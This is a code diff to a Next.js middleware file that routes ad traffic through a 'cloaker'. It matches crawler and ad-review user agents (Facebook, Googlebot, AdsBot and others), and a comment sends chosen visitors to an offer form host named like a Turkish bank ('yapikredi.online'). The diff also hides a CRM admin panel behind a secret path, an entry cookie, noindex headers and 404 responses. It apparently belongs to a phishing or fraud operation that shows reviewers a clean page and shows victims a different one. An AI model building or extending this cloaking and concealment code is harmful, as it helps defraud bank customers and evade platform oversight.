@@ -1,6 +1,7 @@
 import { NextResponse } from "next/server";
 import type { NextRequest } from "next/server";
 import { isAdminHost, isCrmPath } from "@/lib/admin-host";
+import { getCrmSecretPath, isCrmSecretPath } from "@/lib/crm-path";
 import {
   checkCloak,
   isCloakTestIp,
@@ -10,12 +11,10 @@ import {
 } from "@/lib/cloaker";
 import {
   buildOfferHostUrl,
-  getDefaultOfferHost,
   hasAdClickInUrl,
   isAdPoolHost,
   isOfferHost,
   isTrustedOfferArrival,
-  normalizeHostname,
 } from "@/lib/offer-host";
 import { createOfferPassToken, OFFER_PASS_PARAM } from "@/lib/offer-pass";
 
@@ -23,6 +22,8 @@ const CRAWLER_UA =
   /facebookexternalhit|Facebot|Meta-ExternalAgent|meta-externalagent|LinkedInBot|Twitterbot|Googlebot|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|ia_archiver|Pinterestbot|AdsBot-Google/i;
 
 const CLOAK_HEADER = "x-cloak-page";
+const NOINDEX_HEADER = "noindex, nofollow, noarchive, nosnippet";
+const CRM_ENTRY_COOKIE = "crm_entry_ok";
 
 function bypass(pathname: string): boolean {
   return (
@@ -79,13 +80,58 @@ export async function middleware(request: NextRequest) {
   const { pathname } = request.nextUrl;
   const host = request.headers.get("host");
 
+  if (isCrmSecretPath(pathname)) {
+    if (!isAdminHost(host)) {
+      return new NextResponse(null, { status: 404 });
+    }
+
+    const target = request.nextUrl.clone();
+    target.pathname = "/crm";
+    const response = NextResponse.rewrite(target);
+    response.headers.set("X-Robots-Tag", NOINDEX_HEADER);
+    response.cookies.set(CRM_ENTRY_COOKIE, "1", {
+      httpOnly: true,
+      sameSite: "strict",
+      secure: secureCookie(request),
+      path: "/",
+      maxAge: 60 * 60 * 6,
+    });
+    return response;
+  }
+
+  if (pathname === "/crm" || pathname.startsWith("/crm/")) {
+    return new NextResponse(null, {
+      status: 404,
+      headers: { "X-Robots-Tag": NOINDEX_HEADER },
+    });
+  }
+
+  if (pathname.startsWith("/api/crm")) {
+    if (!isAdminHost(host) || request.cookies.get(CRM_ENTRY_COOKIE)?.value !== "1") {
+      return new NextResponse(null, {
+        status: 404,
+        headers: { "X-Robots-Tag": NOINDEX_HEADER },
+      });
+    }
+
+    const response = NextResponse.next();
+    response.headers.set("X-Robots-Tag", NOINDEX_HEADER);
+    return response;
+  }
+
   if (isCrmPath(pathname) && !isAdminHost(host)) {
     return new NextResponse(null, { status: 404 });
   }
 
-  if (isAdminHost(host)) {
+  if (isAdminHost(host) && isCrmPath(pathname)) {
+    const response = NextResponse.next();
+    response.headers.set("X-Robots-Tag", NOINDEX_HEADER);
+    return response;
+  }
+
+  if (isAdminHost(host) && !isAdPoolHost(host)) {
     if (pathname === "/" || pathname === "") {
-      return NextResponse.redirect(new URL("/crm", request.url), 302);
+      return NextResponse.redirect(new URL(getCrmSecretPath(), request.url), 302);
     }
     return NextResponse.next();
   }
@@ -94,12 +140,9 @@ export async function middleware(request: NextRequest) {
     return NextResponse.next();
   }
 
-  const normalizedHost = normalizeHostname(host);
-  const formHost = getDefaultOfferHost();
-
   // Reklam domainleri birbirine yönlendirilmez.
   // Her entry domain kendi hostunda cloaker'dan geçer; offer kararı çıkarsa
-  // sadece form/offer hostuna (örn. yapikredi.online) yönlenir.
+  // sadece CRM'de ayarlı form/offer hostuna (örn. yapikredi.online) yönlenir.
 
   if (CRAWLER_UA.test(ua)) {
     return NextResponse.redirect(
